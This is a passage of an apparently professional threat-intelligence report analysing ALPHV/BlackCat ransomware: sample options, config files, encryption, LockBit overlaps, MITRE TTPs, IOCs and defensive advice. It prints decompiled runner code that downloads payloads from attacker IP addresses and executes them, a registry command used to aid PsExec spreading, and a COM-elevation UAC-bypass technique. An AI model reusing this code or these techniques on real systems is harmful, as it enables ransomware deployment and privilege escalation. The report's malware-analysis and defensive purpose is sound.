alphv, December 4 in [Job] - search, execution of work\n  \n  alphv\n  byte\n  \n  We need experienced pentesters, you have not seen such a level yet, to find out all the details write to the contact below.\n  TOX: ..........................\n  TOX: ..........................\n  JAB: ..........................\n```\n\n*Figure 6: Screenshot taken from the Exploit underground forum showing the active recruiting process engaged by ALPHV to collaborate with pentesters specialized in Windows/Linux and ESXi. They shared two TOX addresses and a Jabber to discuss in a secure environment.*\n\n**Focusing now on the ransomware anatomy**, the latter encrypts selected files throughout a whitelist and adds custom extensions to infected files (7 length extension such as .sykffle was so far witnessed in the wild for this program and most of the time chosen randomly). A peculiar trait of this ransomware upon deployment is its ability throughout command-line to apply numerous options (reachable via –help). Available features are presented for Windows and Linux systems respectively in Figure 7 and Figure 8.\n\n```image\nAlt: ALPHV Windows Features\nDescription: The image is a screenshot of a command-line interface displaying usage information for a ransomware program, likely related to ALPHV. It includes various flags and options that can be used when executing the program, such as '--access-token', '--log-file', and flags to control the behavior of the process (e.g., running as a child process, logging to console, and controlling propagation). Each option is accompanied by a brief description, indicating its purpose in the command execution.\nTranscription: |\n  USAGE:\n      [FLAGS] [OPTIONS] --access-token <ACCESS_TOKEN> [SUBCOMMAND]\n  \n  FLAGS:\n      -c, --child              Run as child process\n      -h, --help               Print help information\n      -n, --no-net             Do not process network shares\n      -p, --propagated         Run as propagated process\n      -u, --ui                 Show user interface\n      -v, --verbose            Log to console\n      -V, --version            Print version information\n  \n  OPTIONS:\n      -a, --access-token <ACCESS_TOKEN>    Access Token\n      -l, --log-file <LOG_FILE>            Enable logging to specified file\n      -h, --no-prop-servers <NO_PROP_SERVERS>...    Do not propagate to defined servers\n      -p, --paths <PATHS>...               Only process files inside defined paths...\n```\n\n*Figure 7: Features provided by a representative sample of an ALPHV ransomware sample targeting Windows systems.*\n\n```image\nAlt: ALPHV Linux Features\nDescription: The image displays a command-line interface output for ALPHV ransomware, specifically showing usage instructions and options available for the malware. The text includes various command-line parameters such as '--access-token', '--bypass', and '--log-file', among others. Each parameter has a brief description of its function, indicating how the ransomware can operate in different scenarios, such as being invoked as a child process or controlling virtual machines on ESXi. The structured formatting of options suggests that this is a part of a technical documentation or a help command for users of the ransomware.\nTranscription: |\n  USAGE:\n    3a08e3bfec2db5dbec359ac9662e65361a8625a0122e68b56cd5ef3aedf8ce1 [OPTIONS] [SUBCOMMAND]\n  \n  OPTIONS:\n    --access-token <ACCESS_TOKEN>            Access Token\n    --bypass <BYPASS>...\n    --child                                  Run as child process\n    --drag-and-drop                          Invoked with drag and drop\n    --drop-drag-and-drop-target              Drop drag and drop target batch file\n    --extra-verbose                          Log more to console\n    -h, --help                               Print help information\n    --log-file <LOG_FILE>                    Enable logging to specified file\n    --no-net                                 Do not discover network shares on Windows\n    --no-prop                                Do not self propagate (worm) on Windows\n    --no-prop-servers <NO_PROP_SERVERS>...\n    --no-vm-kill                             Do not stop VMs on ESXi\n    --no-vm-kill-names <NO_VM_KILL_NAMES>...\n    --no-vm-snapshot-kill                    Do not wipe VMs snapshots on ESXi\n    --no-wall                                Do not update desktop wallpaper on Windows\n    --propagated                             Run as propagated process\n    -p, --paths <PATHS>...                   Only process files inside defined paths\n    -u, --ui                                 Show user interface\n    -v, --verbose                            Log to console\n```\n\n*Figure 8: Features provided by a representative sample of an ALPHV ransomware sample targeting Linux systems*\n\nEvery sample can be customized via an embedded JSON configuration file as shown by Bleeping computer that enables common features such as creating a unique access token is a previously seen anti-analysis tactic used by similar threats such as for the victim to keep negotiations for private, changing extensions, ransom notes, data encryption, exclusions of folders/files/extensions, and the services and processes to be automatically killed to crank up the impact. Supplying an access token as a parameter is previously seen anti-analysis tactic such as threats like Egregor.\n\n```image\nAlt: ALPHV Config File\nDescription: The image displays a screenshot of a configuration file associated with the ALPHV ransomware. The configuration includes parameters such as the public key, file extension for encrypted files (.sykffle), ransomware name, encryption modes, processes to be killed, directories and files to be excluded from encryption, and various options related to network discovery and self-propagation. The text is presented in a command-line interface format, highlighting specific settings that the ransomware utilizes to execute its functions effectively.\nTranscription: |\n  Wrote 3858 bytes to blackCat_config=ae5d3cced6725f37e2c37977536467.json\n  \n  config ID:\n  Public Key:\n  \n  File Extension: sykffle\n  Ransomnote Filename: RECOVER-${EXTENSIONS}-FILES.txt\n  Default File Encryption Mode: map[SmartPartner:[3.145728e+07 10]]\n  Default File Encryption Cipher: Best\n  compromised_credentials:\n  Services to be killed:\n  Processes to be killed: [emops memtas veeam svc backup sql vss msexchange sql*]\n  Directories to be excluded: [system volume information intel $windows.~bt]\n  Files to be excluded: [desktop.ini autorun.inf ntldr bootsec.bak thumbs.db bootfont.bin ntuser.dat ntuser.ini ntuser.dat.log]\n  msn\n  \n  File Path Wildcards:\n  Network Discovery: true\n  Self-Propagation: false\n  Set Wallpaper: true\n  ESXi VM Kill: false\n  ESXi Snapshot Kill: false\n  Strict Include Paths: []\n  ESXi VM Kill Exclude: []\n```\n\n*Figure 9: Screenshot of a representative sample of the config file extracted from a Windows ALPHV ransomware strain. Admin credentials and the victim’s name could be stored and could leak upon negotiations to the public even before being exposed on ALPHV’s DLS if a payload is pushed towards a third-party platform. Several features that can be enabled or disabled make this ransomware very versatile and impactful, in particular the capability of ESXi VM and Snapshot kill.*\n\nWe could extract and analyse several outputs of both Linux and Windows samples and confirm the conclusions of **S2W** (see Figure 9). Of important note is that every successful attack stores Admin credentials and the victim’s name into specific fields of the config file that could become public once payloads are submitted to third-party platforms such as Virustotal (please see an obfuscated example displayed via an open-source script).\n\nEvery compiled sample analysed so far would have been compiled via the emerging **Rust** language, instead of a more commonly encountered C/C++ language. Rust is a multi-paradigm programming language, developed by Mozilla in 2010. As a matter of fact, it is the third impactful malware written in **Rust** language, and **the first of a kind as a Ransomware-as-a-service**. Such a peculiar choice was probably made not only because **Rust** is a cross-platform language (Windows, Linux, OSX) but also to better evade existing detection capabilities and reverse engineering methods. Moreover, when compared with C/C++ programming language, as **Rust** applies stricter rules, the latter could be considered more secure by default in the eyes of a programmer. Alternatively the **GoLang** programming language keeps growing fast and is also an open-source project with cross-platform capabilities. The latter was already used for instance by HIVE or NEPHILIM RaaS programs to take advantage of the language’s concurrency features to encrypt files faster. However, its ties with Google might restrain some operators of ransomwares, as Google’s projects in overall do not fit the political vision they want to display to the public.\n\nThere are four types of encryption options as described by BleepingComputer (*i.e.*, Full, Fast, DotPattern and Auto). All samples of **ALPHV** use a combination of AES128-CTR and RSA-2048 encryption to secure their malware against the researchers getting encrypted files back. Amongst the several modes that AES operates with, mostly used is CBC (Cipher Block Chaining) while CTR (CounTeR) was witnessed in the past by a few threats such as LockerGoga, Nefilim and REvil. In the case where (Advanced Encryption Standard) AES is not supported by the OS and if auto mode option is enabled, ChaCha20 encryption is applied instead. So far, no weaknesses were found and over all, such new **RaaS** program is considered by the cybersecurity to be very sophisticated. **ALPHV** also mentions that in contrast to what happened to Revil after the massive Kaseya attack, a leak of a universal decryptor is not possible.\n\nDiving into reverse engineering code analysis of **ALPHV** ransomware targeting Windows systems, we discuss key functions leveraged by the ransomware and any commonalities found with past known techniques:\n\n- *EnumServicesStatusExW*: is usually used by ransomwares for enumerating all the active services with the aim to delete services matching a list (present in the config file of **ALPHV**). The call of such function was for instance already seen in the wild in the Darkside, BlackMatter, Revil and Netwalker\n- *NetServerEnum*: is used to list all servers of the specified type that are visible in a domain. The latterwas was seen previously also being leveraged by RegretLocker, Wannacry, NotPetya and Trickbot (operated by Wizard Spider) as a worm-like malware propagation module to spread over Server Message Block (**SMB**)\n- *NetShareEnum*: playing the role of discovering network shares to enumerate DNS hostnames on the network, was encountered within numerous ransomwares such as Ranzy locker, Netwalker, Cuba, LockBit, Blackmatter and Conti (operated by Wizard Spider)\n- *EnumdependentServicesW* was found to be shared with Avaddon, LockerGoga to retrieve the name and status of each service that depends on specified services\n- *ARP scanner via the command **“arp -a”*** [T1016]: scans the targeted device’s Address Resolution Protocol (ARP) table which stores information about IP addresses and the corresponding MAC address. The discovery of new networks allows then to fully scan for SMB volumes that can be mounted and eventually encrypted to crank up the impact. Such ARP scanner was previously seen embedded within strains of Darkside, LockBit, Ranzy locker, Avaddon, DopplePaymer. We can also underline variants of Ryuk and Conti that exhibited more sophisticated behaviours by taking advantage of arp. The former reads ARP tables and wake systems up by sending Wake-on-LAN commands (then use RPC to copy itself to identified network shares) while the latter retrieves the ARP cache to focus only on network shares to which the victims normally connects to. To be noted beyond Ryuk’ wake-on-LAN peculiar feature is that other RaaS programs borrowed that capability such as LockBit or Thanos.\n\n```image\nAlt: ARP Scanner\nDescription: The image displays a code snippet from a reverse engineering tool, likely IDA Pro, showing the disassembly of a function related to the ARP command within the ALPHV ransomware's source code. The highlighted lines indicate memory addresses and assembly instructions, specifically referencing the command 'arp -a', which is used to display the ARP table of a network. This suggests the ransomware's capability to scan for devices on a network as part of its propagation strategy.\nTranscription: |\n  .text:004B0DAA\n  .text:004B0DAA loc_4B0DAA:\n  .text:004B0DAA     lea     ecx, [esp+59Ch+lpMem]\n  .text:004B0DAA\n  .text:004B0DB1     mov     edx, offset aArpA ; \"arp -a\\r\\n\"\n```\n\n*Figure 10 Command line tool called arp (available on Linux, MacOS and Windows) was found in the source code of ALPHV ransomware to be used as an ARP scanner feature. The scanner allows to look for details about the network configuration [T1016].*\n\nWe are discussing the approach to gather **indicators of compromise (IOCs)** and define the infrastructure and TTPs leveraged by affiliates of the ALPHV RaaS program and its operator.\n\nBesides, from TLP WHITE **indicators of compromise** shared by the platform Malware Bazaar (5 samples were available) we could pivot on VT intel to harvest other reported and related **IOCs** (**see the Recommendation section for technical details**). By pivoting on one of the ELF Linux variant samples, a lower sized file named *setup.exe* (see details in VT here) that contrasted with the other ransomware payloads has drawn our attention. As no GUID identifier has been found in this file we sought to pivot around artefacts (unique strings into content file). As such, we could find two other similar files reported into VirusTotal (see Figure 11).\n\n```image\nAlt: VirusTotal Intelligence\nDescription: The image is a screenshot from the VirusTotal platform showing the results of a search for files associated with the ALPHV ransomware. It displays several entries, including a file named 'setup.exe' and its associated properties such as detection rates by different antivirus engines, file size, and timestamps indicating when the file was first and last seen. The entries are organized in a table format, highlighting key details that would be relevant for cybersecurity analysis.\nTranscription: |\n  | File Name | Type     | Detections | Size     | First Seen          | Last Seen           | Submitters |\n  | --------- | -------- | ---------- | -------- | ------------------- | ------------------- | ---------- |\n  | setup.exe | peexe    | 38 / 68    | 15.00 KB | 2021-12-27 16:15:10 | 2021-12-27 16:15:10 | 1          |\n  | setup.exe | assembly | 41 / 69    | 15.50 KB | 2021-09-24 00:29:34 | 2021-09-24 00:29:34 | 1          |\n  | setup.exe | peexe    | 41 / 69    | 15.00 KB | 2021-11-18 04:28:38 | 2021-11-18 04:28:38 | 1          |\n```\n\n*Figure 11 Screenshot of VirusTotal Intelligence platform after pivoting on a unique string found into Portable Executable content. The size of the files are very close while the second one turns out to be linked to another infamous Ransomware group dubbed LockBit.*\n\nThose files are .Net modules and not with a PE more standard format file. We analysed more thoroughly the file by reverse engineering the latter via the open-source tool dnSpy. We first want to point out that no obfuscation is at play, thus all code can be directly rationalized. Four main functions stood out as shown in Figure 12 after reversing the runner used by ALPHV’ affiliates. It is interesting to note that download and upload functions point to the IP address:\n\n*141.136.44[.]54*\n\nThe latter resolves the host from which was also present the runner *setup.exe*, meaning that ransomware payloads were hosted at the same place. We found out, about the same time, that @malwrhunterteam substantiated this result in one of their tweet. Once the runner is launched with an access-token set as an input, a messagebox like the one shown in Figure 9 pops up and asks the user whether or not “REALLY RUN LOCKER????”. If the user chooses “YES”, an ALPHV ransomware payload will be downloaded from the remote host- and executed locally.\n\n```image\nAlt: ALPHV Runner\nDescription: The image displays a screenshot of a code snippet from a program named 'setup' that is associated with the ALPHV ransomware. It shows a graphical user interface (GUI) prompt that asks, 'REALLY RUN LOCKER????' with options to respond 'Oui' (Yes) or 'Non' (No). The code structure is visible on the left side, indicating various functions related to the ransomware's operation, including 'DownloadAndRun', 'FullInfo', 'Start', 'UploadDedInfo', and 'UploadFiles'. The access token parameter is also highlighted, which suggests a requirement for an access token to execute the ransomware.\nTranscription: |\n  setup\n  App @02000002\n      Type de base et Interfaces\n      Types dérivés\n      .cctor() : void @06000007\n      App() : void @06000006\n      DownloadAndRun(string, string, bool)\n      FullInfo() : NameValueCollection @06000001\n      Start(string) : void @06000001\n      UploadDedInfo(App.FileInfo, NameValueCollection)\n      UploadFiles(string, IEnumerable<App.FileInfo>) : void @06000005\n      AccessToken : string @04000005\n  \n  --access-token\n  REALLY RUN LOCKER????\n```\n\n```image\nAlt: ALPHV Runner Functions\nDescription: The image depicts a segment of code written in C# that is part of the ALPHV ransomware's runner program. It showcases a method for downloading a file from a specified URL (http://141.136.44.54/files/) and executing it. The code includes a confirmation dialog that prompts the user to either proceed with the download and execution of the file or cancel the operation. If an exception occurs during the download process, an error message is displayed. This piece of code illustrates the operational tactics employed by the ALPHV ransomware to execute malicious payloads.\nTranscription: |\n  try\n  {\n      webClient.DownloadFile(new Uri(\"http://141.136.44.54/files/\" + ExeName), ExeName);\n      if (Confirm || MessageBox.Show(\"Start \" + ExeName + \"?\", MessageBoxButtons.YesNo) == DialogResult.Yes)\n      {\n          Process.Start(ExeName, Args);\n      }\n      break;\n  }\n  catch (Exception ex)\n  {\n      if (MessageBox.Show(ex.Message + \"\\r\\nTry now??\", \"Download and run \" + ExeName + \" error\", MessageBoxButtons.YesNo) == DialogResult.No)\n      {\n          Runner.SelfRemove();\n          flag = false;\n      }\n  }\n```\n\n*Figure 12 Screenshot of the runner setup.exe found to be tight to the ALPHV threat arsenal. Four main functions are at play (DownloadAndRun, FullInfo, Start, UploaddDedInfo and UploadFiles). Both the runner and the payloads are hosted at hxxp://141.136.44[.]54/files/.*\n\n### Commonalities between LockBit2.0 and ALPHV\n\nAfter investigations via VT Intelligence we found that the second hash shown in Figure 11 was detected by some antivirus as **LockBit** ransomware. We thus decided to pursue the research in that direction and pivot around that IOC. After having unravelled the infrastructure behind that IOC, one can observe in Figure 13 that *i* the occurrence **LockBit** is often used in namings *ii* the runner.exe (setup.exe) possesses numerous variants, *iii* URLs follow the same pattern observed for **ALPHV** (*i.e.,* http://ip_address/files/toolname.exe) and *iv* the payload name 4mmc.exe was also used by **ALPHV** (see here an example).\n\nWe checked that the payloads do indeed correspond to **LockBit** weaponized strains. Moreover we found that the hash value of the tool referred to as *screensaver.exe* was reported by The DFIR report back in June 2020 upon an attack by **LockBit** ransomware in which an executable that allows to lock out access to the desktop was dropped but was not used.\n\n```image\nAlt: VirusTotal Intelligence\nDescription: The image depicts a network diagram related to the analysis of the ALPHV ransomware gang and its connections to the LockBit ransomware. It showcases various executable files (e.g., LockBit_gay.exe, setup.exe, 4mmc.exe) and URLs linked to these files, indicating their relationships and potential infrastructure. Key elements are highlighted in red boxes, which draw attention to notable file names and URLs associated with both ransomware groups, suggesting overlaps in their toolsets and methods.\nTranscription: |\n  http://45.9.190.135/files/LockBit_gay.exe\n  LockBit_BDE41E2424C4962.exe\n  http://45.9.190.135/files/lockbit_bde2424c4962.exe\n  http://45.9.190.135/files/screensaver.exe\n  desktop_locker.exe\n  DFIR/report/screensaver Lockbit Desktop\n  http://45.9.190.135/upload\n  setup.exe\n  http://188.120.247.108/files/4mmc.exe\n  http://188.120.247.108/files/screensaver.exe\n```\n\n*Figure 13: Screenshot taken from Virustotal Intelligence platform after having pivoted around the second hash highlighted in Figure 11 (see blue colour). One can observe several IOCs that belong to the infamous LockBit ransomware as well as some of its toolset, namely a screensaver locker, and a runner for downloading payloads for encryption that is similar to the one that ALPHV used.*\n\nAs we found no direct link of this infrastructure with recent attacks perpetrated by **LockBit** affiliates, the latter could also have been used as a test infrastructure by **ALPHV**. This is substantiated by the filename LockBit_gay.exe (see Figure 13) submitted the VT on 2021-11-08, which could indicate that an imposter essentially rebranded the tool used by **LockBit’** affiliates and used it for **ALPHV’s** campaigns. The word ‘gay’ is not without recalling the recent flooded **Babuk’s** new ransomware forum (**RAMP**), crippled by a comment spammer with gay orgy porn GIFs. Not only the filenames (setup.exe), their size (in a range of 15-15.5 KB) but also the source code is obviously strongly overlapping as demonstrated in Figure 14. The main change arises from the adaptation of the code with the aim to include the anti-analysis tactic required for running a payload of ALPHV (*i.e.*, the aforementioned unique accesstoken).\n\n```image\nAlt: Source Code Differencing\nDescription: The image depicts a segment of source code that illustrates the differences between the code used by the LockBit ransomware and the ALPHV ransomware. The code is presented in a side-by-side comparison format, where alterations are highlighted in red and green, indicating the changes made by ALPHV to the original LockBit code. Key functions such as downloading executables with specific parameters are shown, and comments regarding file tokens and offsets are present, suggesting a technical analysis of the code's structure and functionality.\nTranscription: |\n  if (MessageBox.Show(\"REALLY RUN LOCKER???\", App.BuildID, MessageBoxButtons.YesNo) == DialogResult.No)\n  {\n      Environment.Exit(0);\n  }\n  \n  App.AppName = args[0].ToLower().Trim();\n  App.AccessToken = args[1].ToLower().Trim();\n  if (MessageBox.Show(\"REALLY RUN LOCKER???\", App.AppName, MessageBoxButtons.YesNo) == DialogResult.No)\n  {\n      Environment.Exit(0);\n  }\n  \n  namespace setup\n  {\n      Content = Screenshot.MakeDesktopScreenshot();\n  }\n  \n  App.DownloadAndRun(\"LockBit\" + App.BuildID + \".exe\", true);\n  App.DownloadAndRun(App.AppName + \".exe\", \"--access-token \" + App.AccessToken, true);\n  App.UploadDebugInfo(files, App.FullInfo());\n  App.DownloadAndRun(App.ScreenSaverName, App.ScreenSaverArgs, false);\n  Runner.SelfRemove();\n  \n  // Token: 0x00000002 RID: 2 RVA: 0x0000021C File Offset: 0x0000002C\n  // Token: 0x00000002 RID: 2 RVA: 0x00000210 File Offset: 0x00000020\n  private static void DownloadAndRun(string ExeName, string Args = \"\", bool Confirm = true)\n  {\n      using (WebClient webClient = new WebClient())\n      {\n          try\n          {\n              webClient.DownloadFile(new Uri(\"http://45.9.190.135/files/\" + ExeName), ExeName);\n              webClient.DownloadFile(new Uri(\"http://41.136.44.54/files/\" + ExeName), ExeName);\n```\n\n*Figure 14 Source Code Differencing via Git Diff. Reverse engineering analysis shows that the source code of the LockBit’s arsenal (in red) and the ALPHV’s arsenal (in green) are strongly overlapping. The main change arises from the adaptation of the code to include the unique accesstoken per victim required for running a payload of ALPHV.*\n\nIt is hard to conclude at this stage to conclude whether or not **ALPHV** is a ‘new’ group or not. However, it suggests that **ALPHV** at the very least borrowed a part of the **LockBit**’s toolset, which requires non-public knowledge. Such knowledge of leveraging a runner for downloading and running ransomwares from remote servers could have been likely shared by affiliates that participle sometimes to several ransomware-as-a-service program. It could also be a subgroup of **LockBit** that split because of internal frictions or a rebrand triggered by the core-group of **LockBit** to take their ransomware to the next generation and escape sanctions.\n\n### TTPs\n\n#### Intrusion Set\n\nHere is a JSON file format compatible with the MITRE ATT&CK Navigator of shared TTPs of both representative payloads targeting Linux / Windows systems as well as the operator and affiliates modus operandi reported so far. It is interesting to note that by pivoting on their public DLS we found a section dedicated to **ALPHV** affiliates that provides a procedure on how to leverage the ransomware payloads on different operating systems upon an attack (see appendix).\n\n| **Tactic**                   | **Technique**                                                                                                                                                                                            | **Procedure|\n| ---------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ||\n| **Execution** TA0002         | System Services: Service Execution T1569.002 <br><br> Command and Scripting Interpreter: Windows Command Shell T1053.003 <br><br> Windows Management Instrumentation T1047 <br><br> Shared Modules T1129 | In some cases ransomware was deployed via **ScreenConnect** but also via **PSEXEC** (being embedded in the ransomware code after a compression via zlib). **ALPHV** uses significantly the remote administration tool **PsExec** T1035, as well as the PowerShell language T1086. <br><br> **ALPHV** can use the Windows command line to: <br> • Delete volume shadow copies and disable recovery <br> • Modify window registry <br><br> The adversary uses WMI to execute various behaviours, such as gathering information for Discovery <br><br> Fsutil was executed to modify the SymLink Evaluation behaviour to change the type of symbolic links that can be created on the system. Symbolic links create a file in a directory that acts as a shortcut to another file or folder |\n| **Credential access** TA0006 | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay T1557.001 <br><br> OS Credential Dumping: LSA Secrets T1003.004                                                                            | Symantec has reported suspicious Server Message Block (SMB) requests occurred onto the patient zero <br><br> Symantec has reported attempts of remote Local Security Authority (LSA) registry dump from a remote machine on the network upon an attack|\n| **Collection** TA0009        | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay T1557.001                                                                                                                                  | Threat actors may have leveraged LLMNR/NBT-NS Poisoning and SMB Relay sub-technique|\n| **Defense Evasion** TA0005   | Impair Defenses: Disable or Modify Tools T1562.001 <br><br> Signed Binary Proxy Execution: CMSTP T1218.003 <br><br> Modify Registry T1112                                                                | According to Symantec the attackers disabled a restricted remote administration feature known as ‘RestrictedAdmin mode’ but also Windows defender <br><br> Well-known technique to circumvent Windows’ User Account Control (UAC) (see details in appendix) <br><br> Modification of the registry occurred upon an attack. According to Symantec attackers were also seen to tweak the maximum limit of concurrent requests machines by modifying the Windows registry to further help spreading via PsExec. Please note that we found that this is actually a capacity of the ransomware itself and not a human-operated command (see Appendix)                                                                                                                                         |\n| **Discovery** TA0007         | System Information Discovery T1082 <br><br> System Network Connections Discovery T1049 <br><br> Ingress Tool Transfer T1105                                                                              | **ALPHV** runs commands to collect system information via **WMIC**, in order to collect Universally Unique Identifiers (UUIDs) from each machine. These are then used to generate the ‘access token’ that makes up part of the unique Tor address victims are instructed to visit <br><br> **ALPHV** attempts to propagate via mounting hidden partitions thanks to the ‘net use’ command. As aforementioned admin credentials are embedded into the config file within the payload <br><br> **ALPHV** affiliates bring their own external **tools** into a compromised network                                                                                                                                                                                                          |\n| **Exfiltration** TA0010      | Exfiltration Over Web Service T1567                                                                                                                                                                      | Double extortion: exposure of sensitive data on a DLS. **ALPHV leaks victim data not only if the victims do not pay, but also once Threat Intel teams accesses their chat logs or discusses their operations**. This posture recalls recent threats proclaimed by several **RaaS** groups as chat logs were leaked and exposed by CTI teams and renowned cybersec journalists that weakened the leverage of the malicious negotiators                                                                                                                                                                                                                                                                                                                                                    |\n| **Impact** TA0040            | Inhibit System Recovery T1490 <br><br> Data Destruction T1485 <br><br> Service Stop T1489 <br><br> Data Encrypted for Impact T1486 <br><br> Network Denial of Service T1498                              | According to @malwrhunterteam this could be the first **ransomware** that does **VM snapshots cleaning**. The latter deletes also **shadow copies and the Recycle Bin** <br><br> According to @vxunderground the latter **deletes decryption keys** <br><br> As previously seen **ALPHV** payloads have the capability to stop services and kill processes to increase the impact (with the help of the **EnumServicesStatusExW** function to enumerate all the active services and deletes services if the service name matches the list present in the config file) <br><br> Simple extortion: encryption of sensitive data <br><br> Triple extortion: As an additional extortion method, the threat actors threaten to **DDoS** victims unless they pay a ransom                      |\n\n### Malware(s)/Tool(s)\n\n- **ConnectWise** (formerly known as **ScreenConnect**), that is a legitimate remote administration tool was leveraged. This tool was already seen abused in the past by other ransomcartels such as Revil upon the recent massive attack against Kaseya and APTs since 2016\n- **Another legitimate tool** Keystore explorer that can be used to create and navigate KeyStores via its intuitive graphical interface was reported. Though it is not yet clear if there is any link with **ALPHV** at this stage (see here), one could conjecture that this tool was leveraged to generate unique key pairs for each victim but should be considered as a false positive.\n- **7zip** and **Rclone** were reported by SpearTip as the toolset use for exfiltration of data\n\n### Vulnerabilities\n\n- **No known vulnerabilities are yet reported** to be leveraged by the affiliates of this **RaaS** program to the best of our knowledge. We should mention though that **SentinelOne** telemetry indicated “*a primary delivery of BlackCat is via 3rd party framework/toolset (e.g., Cobalt Strike) or via exposed (and vulnerable) applications*”\n- We should mention that other entry vector remain extensively used **RDP** brute force attacks or unsecure **RDP/VPN** connections. It is also likely that this advanced threat actor, if not already, could rapidly leverage an Initial Access Broker to provide to its affiliates a foothold on a victim’ network. Keep in mind that such **Initial Access Brokers (IABs)** could also leverage the last vulnerability that defrayed the chronicle being **LOG4SHELL**\n\n### Course of action\n\n#### Avoid IABs or affiliates to breach into your network\n\n- Focus efforts on patching/monitoring the most impactful flaws reported in information bulletins produced by Intrinsec CTI Team about last TTPs of such ecosystem (*PrintNightmare, Proxy|logon|Shell|Oracle, PetitPotam, LogShell, VMWare*)\n- Enable hardware MFA keys whenever possible on critical assets requiring the most protection\n- Identify then document an organization’s people, information and in particular exposed assets such as VPN, RDP, web servers, etc… (*N.B.,* the latter shall always be up to date)\n- Train your teams to phishing & social-engineering methods\n- Use a WAF to filter and monitor incoming web traffic (*N.B.,* the latter shall always be up to date) for web servers and apps\n- Reinforce the security monitoring of Windows workstations, with an EDR (or failing that, Sysmon), and a reinforced audit policy\n- Conduct vulnerability scans regularly on exposed servers to confirm whether or not it is vulnerable against known attack schemes\n- Reinforce perimeter filtering (email/browsing) with sandboxing for all attachments and downloaded files, plus SSL inspection\n- Maintain and regularly assess a disaster recovery plan, including global backup capabilities (onsite and offsite)\n- Reinforce authentication with strong authentication means wherever possible, password strength policy plus audit in place, and log forwarding to the SIEM\n- Do not forget BYOD security management: security policies deployment and enforcement, compliancy, inventory, network access control\n- Cobalt Strike, being maybe the most prolific post-exploitation framework tool both leveraged not only by red teamers and top-tier RaaS affiliates but also by several APTs, it is worth putting efforts to become capable of detecting its capabilities\n\n#### Detect **ALPHV** affiliates before your data gets exfiltrated and then encrypted\n\n- Craft fake documents (financial, cyber insurance, employee data falling under GDPR) that will beacons back alerting blue teams only with very high rates of true positives thanks to Canarytokens. As such, Incident Response teams would be more efficient in preempting/expelling threats by being involved at early stages of an attack\n- Monitor IOCs & commands that we capitalized, vetted and made available on our GitHub. Please note that if you are an Intrinsec SOC (Security Operation Center) customer, the IOCs related to this campaign are being integrated into our MISP\n- Block globally network & system IOCs\n\n#### Detect **ALPHV** affiliates before your data gets encrypted while being exfiltrated\n\n- Ensure blue teams can carry out threat detection of **RClone** (leveraged by **ALPHV** for data exfiltration) with relevant Sigma rules such as here and here\n\n#### Detect **ALPHV** affiliates while encrypting data to reduce the impact\n\n- It is worth mentioning here that an open-source tool has been recently developed by the CTO of Nextron Florian Roth for deception purposes (available on GitHub). Named “Raccine”, this tool can detect and stop any Windows process trying to delete the shadow volumes on a system that can be triggered by **ALPHV** payloads or by other similar type of threats.\n\n## References:\n\n- https://www.bleepingcomputer.com/news/security/alphv-blackcat-this-years-most-sophisticated-ransomware/\n- https://github.com/cdong1012/Rust-Ransomware\n- https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-alphv-rust-ransomware\n- https://medium.com/s2wblog/blackcat-new-rust-based-ransomware-borrowing-blackmatters-configuration-31c8d330a809\n- https://id-ransomware.blogspot.com/2021/12/blackcat-ransomware.html\n\n## Appendix\n\n### Malware information\n\n#### [TTPs of a WINDOWS’ payload]\n\nA JSON file format compatible with the MITRE ATT&CK Navigator highlights shared Tactics, Techniques and Procedures (TTPs) according to the **MITRE ATT&CK framework** of a representative payload targeting **Windows** systems leveraged by **ALPHV**.\n\nAs far as registry key modification is concerned, a reverse engineering analysis showed that ALPHV ransomwares targeting Windows embed the following command (see Figure 15):\n\n`reg add HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesLanmanServerParameters /v MaxMpxCt /d 65535 /t REG_DWORD /fenum_serv’`\n\n```image\nAlt: Registry Key Modification\nDescription: The image displays a portion of code from a reverse engineering analysis related to ALPHV ransomware. It shows specific registry modification commands used by the ransomware to manipulate Windows system settings. The highlighted lines include a command to add a registry key (`reg add HKEY_LOCAL_MACHINE\to...`) indicating the operational details of the ransomware's payload, alongside annotations that provide context on the data and its references. This technical content is directly related to the discussion of Tactics, Techniques, and Procedures (TTPs) of the malware.\nTranscription: |\n  .rdata:0000EEC37 db 0\n  .rdata:0060ECE58 aRegAddHkeyLoca db 'reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Lanman' ; DATA XREF: sub_4B0CE0:loc_4B0D03\n  .rdata:0060ECE58 db 'anServer\\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /fenum_serv'\n  .rdata:0060ECE4 dd offset aRegAddHkeyLoca+79h ; DATA XREF: sub_486D50+3B4to\n  .rdata:0060ECE4 db 'ices::ok=',0\n  .rdata:0060ECE8 db 12h\n```\n\n*Figure 15: Screenshot highlighted the registry key adding in ransomware code aiming at exalting the spreading via PsExec upon the attack.*\n\nIn some of those payloads, a reverse engineering analysis unravelled attempts to bypass Windows User Account Control (UAC) to stealthy execute code with elevated permissions T1218.003. This technique is also known as the COM Elevation Moniker that allows running applications under UAC to activate COM classes with elevated privileges. More precisely, we found a globally unique identifier (CLSID) {3E5FC7F9-9A51-4367-9063-A120244FBEC7} (128-bit hexadecimalnumbers within a pair of curly braces can be retrieved in the registry path *“WorkstationHKEY_LOCAL_MACHINESOFTWAREClassesAppID{3E5FC7F9-9A51-4367-9063-A120244FBEC7}”*) that could be associated with the Cmstplua.dll (aka Connection Manager Admin API Helper for Setup). Such CLSID is usually leveraged for detecting bypass UAC via an auto-elevated COM interface.\n\nIn the same vein as was reported by Sophos in April 2020 in the case of LockBit 2.0 ransomware, ALPHV will ensure to exalt damages by checking whether or not its process owns Administrator rights (via OpenProcessToken function). If not the latter masquerades as Windows Explorer (explorer.exe) by calling CoInitializeEx (initializing the COM library). Then, the hex value CLSID is added to the moniker and executed. We also found another typical string referred to as “evation:Administrator!new:” that is similar to the expected value “Elevation:Administrator!new:” as indicated in the Microsoft documentation, which allows apps running under UAC to activate COM classes with elevated privileges (see Figure 16):\n\n```image\nAlt: UAC Bypass\nDescription: The image depicts a snippet of code from a reverse engineering analysis of the ALPHV ransomware. It highlights a function call to 'CoInitializeEx' and a globally unique identifier (CLSID) enclosed in curly braces, which is associated with the COM Elevation Moniker used to bypass Windows User Account Control (UAC). The code is formatted in a typical programming style, featuring syntax highlighting for different elements such as variables and function calls, which is common in development 